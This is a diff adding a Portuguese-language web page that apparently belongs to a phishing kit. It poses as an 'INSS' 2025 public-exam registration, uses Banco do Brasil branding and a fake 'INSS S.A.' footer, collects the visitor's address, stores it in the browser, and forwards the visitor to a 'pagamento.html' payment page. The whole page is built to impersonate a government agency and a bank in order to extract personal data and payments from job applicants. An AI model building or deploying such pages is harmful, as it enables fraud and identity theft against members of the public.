@@ -1,0 +1,277 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>INSS - Inscrição Concurso 2025 | Confirmação de Endereço</title>
+  
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'bb-yellow': '#FEEF37',
+            'bb-blue': '#003DA5',
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+    }
+    /* Estilização opcional para o campo CEP com erro */
+    .input-error {
+      border-color: #dc2626; /* vermelho-600 */
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+  <!-- TOPO AMARELO (LOGO E TÍTULO) -->
+  <header class="bg-bb-yellow py-6 flex flex-col items-center justify-center shadow">
+    <!-- Logo BB -->
+    <img src="images/uDnvve3cM2Rm.png" alt="Logo do Banco do Brasil" class="h-12 mb-2">
+    <!-- Texto principal -->
+    <p class="text-bb-blue font-bold text-xl">
+      CONCURSO PÚBLICO 2025
+    </p>
+    <p class="text-bb-blue text-sm">
+      SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+    </p>
+  </header>
+
+  <!-- BARRA AZUL (CONFIRMAÇÃO DE ENDEREÇO) -->
+  <nav class="bg-bb-blue py-3 shadow-md">
+    <div class="container mx-auto px-4 flex items-center justify-center">
+      <span class="text-white text-xl font-semibold tracking-wide">
+        CONFIRMAÇÃO DE ENDEREÇO
+      </span>
+    </div>
+  </nav>
+
+  <!-- CONTEÚDO PRINCIPAL -->
+  <main class="container mx-auto px-4 py-8 flex-grow max-w-3xl">
+    <h1 class="text-xl font-semibold text-gray-800 mb-2">
+      Endereço para Correspondência
+    </h1>
+    <p class="text-gray-600 mb-6">
+      Por favor, informe seu endereço para envio de correspondências:
+    </p>
+
+    <!-- FORMULÁRIO DE ENDEREÇO -->
+    <form id="formEndereco" class="space-y-4">
+      <!-- CEP -->
+      <div>
+        <label class="block text-gray-700 text-sm font-medium mb-1" for="cep">
+          CEP
+        </label>
+        <input type="text" id="cep" class="border border-gray-300 rounded-md w-full py-2 px-3 text-gray-700 
+                 focus:outline-none focus:ring-2 focus:ring-bb-blue focus:border-transparent" placeholder="00000-000" maxlength="9" required="">
+        <p id="cepError" class="text-red-600 text-xs mt-1 hidden">
+          CEP inválido ou não encontrado.
+        </p>
+      </div>
+
+      <!-- Logradouro -->
+      <div>
+        <label class="block text-gray-700 text-sm font-medium mb-1" for="logradouro">
+          Logradouro
+        </label>
+        <input type="text" id="logradouro" class="border border-gray-300 rounded-md w-full py-2 px-3 text-gray-700 
+                 focus:outline-none focus:ring-2 focus:ring-bb-blue focus:border-transparent" placeholder="Ex: Rua, Avenida..." required="">
+      </div>
+
+      <!-- Número -->
+      <div>
+        <label class="block text-gray-700 text-sm font-medium mb-1" for="numero">
+          Número
+        </label>
+        <input type="text" id="numero" class="border border-gray-300 rounded-md w-full py-2 px-3 text-gray-700 
+                 focus:outline-none focus:ring-2 focus:ring-bb-blue focus:border-transparent" placeholder="Digite o número" required="">
+      </div>
+
+      <!-- Complemento -->
+      <div>
+        <label class="block text-gray-700 text-sm font-medium mb-1" for="complemento">
+          Complemento (opcional)
+        </label>
+        <input type="text" id="complemento" class="border border-gray-300 rounded-md w-full py-2 px-3 text-gray-700 
+                 focus:outline-none focus:ring-2 focus:ring-bb-blue focus:border-transparent" placeholder="Apartamento, sala, conjunto...">
+      </div>
+
+      <!-- Bairro -->
+      <div>
+        <label class="block text-gray-700 text-sm font-medium mb-1" for="bairro">
+          Bairro
+        </label>
+        <input type="text" id="bairro" class="border border-gray-300 rounded-md w-full py-2 px-3 text-gray-700 
+                 focus:outline-none focus:ring-2 focus:ring-bb-blue focus:border-transparent" placeholder="Digite o bairro" required="">
+      </div>
+
+      <!-- Cidade -->
+      <div>
+        <label class="block text-gray-700 text-sm font-medium mb-1" for="cidade">
+          Cidade
+        </label>
+        <input type="text" id="cidade" class="border border-gray-300 rounded-md w-full py-2 px-3 text-gray-700 
+                 focus:outline-none focus:ring-2 focus:ring-bb-blue focus:border-transparent" placeholder="Informe a cidade" required="">
+      </div>
+
+      <!-- Estado -->
+      <div>
+        <label class="block text-gray-700 text-sm font-medium mb-1" for="estado">
+          Estado
+        </label>
+        <input type="text" id="estado" class="border border-gray-300 rounded-md w-full py-2 px-3 text-gray-700 
+                 focus:outline-none focus:ring-2 focus:ring-bb-blue focus:border-transparent" placeholder="Ex: SP, RJ, MG..." required="">
+      </div>
+
+      <!-- Botão de Confirmar Endereço -->
+      <div class="pt-4">
+        <button type="submit" class="bg-bb-blue text-white font-medium py-3 px-6 w-full rounded-md hover:bg-blue-800 transition text-lg">
+          Confirmar Endereço
+        </button>
+      </div>
+    </form>
+  </main>
+
+  <!-- RODAPÉ -->
+  <footer class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto">
+    <p class="text-sm font-medium">
+      © 2025 INSS S.A. Todos os direitos reservados.
+    </p>
+    <p class="text-sm mt-1">
+      Central de Atendimento INSS - 0800 729 0722
+    </p>
+  </footer>
+
+  <!-- SCRIPT -->
+  <script>
+    // Função para remover caracteres não numéricos do CEP
+    function limparCEP(cep) {
+      return cep.replace(/\D/g, '');
+    }
+
+    // Função para formatar CEP em 00000-000
+    function formatarCEP(valor) {
+      const cepSemMask = limparCEP(valor);
+      if (cepSemMask.length <= 5) {
+        return cepSemMask;
+      } else {
+        return cepSemMask.slice(0,5) + '-' + cepSemMask.slice(5);
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const formEndereco = document.getElementById("formEndereco");
+      const cepInput     = document.getElementById("cep");
+      const logradouro   = document.getElementById("logradouro");
+      const numero       = document.getElementById("numero");
+      const complemento  = document.getElementById("complemento");
+      const bairro       = document.getElementById("bairro");
+      const cidade       = document.getElementById("cidade");
+      const estado       = document.getElementById("estado");
+      const cepError     = document.getElementById("cepError");
+
+      // MASCARA DE CEP (00000-000)
+      cepInput.addEventListener("input", function(e) {
+        const valorFormatado = formatarCEP(e.target.value);
+        e.target.value = valorFormatado;
+      });
+
+      // Dispara a consulta ao ViaCEP ao perder o foco do CEP (blur),
+      // ou quando o usuário digitar 9 caracteres no CEP.
+      cepInput.addEventListener("blur", () => {
+        buscarCEP(cepInput.value);
+      });
+
+      cepInput.addEventListener("keydown", (e) => {
+        // Se o usuário pressionar Enter no campo CEP, já tenta buscar
+        if (e.key === "Enter") {
+          e.preventDefault();
+          buscarCEP(cepInput.value);
+        }
+      });
+
+      function buscarCEP(cepDigitado) {
+        // Limpa apenas números
+        const cepLimpo = limparCEP(cepDigitado);
+
+        // Se não tem 8 dígitos, não faz nada
+        if (cepLimpo.length !== 8) {
+          return;
+        }
+
+        // Monta URL da API ViaCEP
+        const url = `https://viacep.com.br/ws/${cepLimpo}/json/`;
+
+        fetch(url)
+          .then(response => {
+            if (!response.ok) {
+              throw new Error("Erro ao consultar ViaCEP");
+            }
+            return response.json();
+          })
+          .then(data => {
+            if (data.erro) {
+              // Se a API retorna "erro: true", CEP não existe
+              exibirErroCEP(true);
+              return;
+            }
+            // Preenche os campos
+            logradouro.value = data.logradouro || "";
+            bairro.value     = data.bairro     || "";
+            cidade.value     = data.localidade || "";
+            estado.value     = data.uf         || "";
+            exibirErroCEP(false);
+          })
+          .catch(err => {
+            console.error("Erro na consulta do CEP:", err);
+            exibirErroCEP(true);
+          });
+      }
+
+      function exibirErroCEP(temErro) {
+        if (temErro) {
+          cepInput.classList.add("input-error");
+          cepError.classList.remove("hidden");
+        } else {
+          cepInput.classList.remove("input-error");
+          cepError.classList.add("hidden");
+        }
+      }
+
+      // Ao enviar o formulário
+      formEndereco.addEventListener("submit", (event) => {
+        event.preventDefault();
+
+        // Captura os valores
+        const cepVal         = cepInput.value;
+        const logradouroVal  = logradouro.value;
+        const numeroVal      = numero.value;
+        const complementoVal = complemento.value;
+        const bairroVal      = bairro.value;
+        const cidadeVal      = cidade.value;
+        const estadoVal      = estado.value;
+
+        // Você pode salvar no localStorage
+        localStorage.setItem("cepCandidato", cepVal);
+        localStorage.setItem("logradouroCandidato", logradouroVal);
+        localStorage.setItem("numeroCandidato", numeroVal);
+        localStorage.setItem("complementoCandidato", complementoVal);
+        localStorage.setItem("bairroCandidato", bairroVal);
+        localStorage.setItem("cidadeCandidato", cidadeVal);
+        localStorage.setItem("estadoCandidato", estadoVal);
+
+        // Redireciona para pagamento.html (ou outra página)
+        window.location.href = "pagamento.html";
+      });
+    });
+  </script>
+
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl508546'},{'dcenter':'p3'},{'cp_id':'10284161'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script></body></html>
